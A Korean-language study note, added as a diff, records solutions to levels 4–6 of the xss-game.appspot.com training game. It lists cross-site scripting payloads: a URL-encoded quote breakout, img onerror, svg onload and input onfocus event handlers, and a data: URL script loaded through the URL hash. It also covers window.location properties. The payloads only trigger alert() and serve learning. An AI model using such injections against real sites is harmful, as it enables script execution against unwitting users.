@@ -1,0 +1,36 @@
+﻿# xss-game.appspot.com/level4
+1%27)%3balert(1)%3b(%271
+-> 시도 했었으나 안풀린것 같았는데 URL 인코딩을 해버리면 문제가 해결된다... 참고 참고...
+
+
+##### xss-game.appspot.com/level5
+<img src onerror=alert(1)> 로 문제 해결
+-> 힌트를 보고 'javascript=alert(1)' 와 같은 방식을 사용해봤으나 alert이 뜨지 않았음.
+=> <input onfocus=javascript:alert(1) autofocus>, <svg onload=alert(1)> 도 가능.
+
+
+##### xss-game.appspot.com/level6
+# URL에서 값 가져오기 (javascript - window.location)
+xss-game.appspot.com/level6/frame#/static/gadget.js
+- alert(window.location.hash);	//"#/static/gadget.js"
+-> window.location.hash.substr(1);	"/static/gadget.js" (한글자를 잘라서 보여줌)
+- alert(window.location.host);	//"xss-game.appspot.com"
+- alert(window.location.hostname);	//"xss-game.appspot.com"
+- alert(window.location.href);	"http://xss-game.appspot.com/level6/frame#/static/gadget.js"
+- alert(window.location.origin);	//"http://xss-game.appspot.com"
+- alert(window.location.pathname);	//"/level6/frame"
+- alert(window.location.protocol);	//"http:"
+- window.location.toString();	//""http://xss-game.appspot.com/level6/frame#/static/gadget.js""
+- window.location.reload();	// 웹페이지 리로드
+
+# data URL Scheme
+xss-game 6번 문제를 풀다가 알게 된 기법으로 크게 두가지 방법으로 데이터를 삽입 가능함. (이미지 파일을 별도로 두지 않고 하나의 html 파일에서 데이터를 불러올 수 있음)
+- url 인코딩
+- base64 인코딩
+-> base64 test.png 명령을 통해 그림파일을 base64로 변환 후 img 태그의 src에 아래와 같이 넣어준다.
+<img src="data:image/png;base64,blablar.......">
+=? data: 로 data URL Scheme 를 명시하고, type을 image/png로 나타내준 후 어떤 인코딩이 되었는지 웹에게 알려줌.
+
+- 두가지의 풀이방법이 있음.
+data url scheme 방식
+xss-game.appspot.com/level6/frame#data:text/javascript,alert(123);
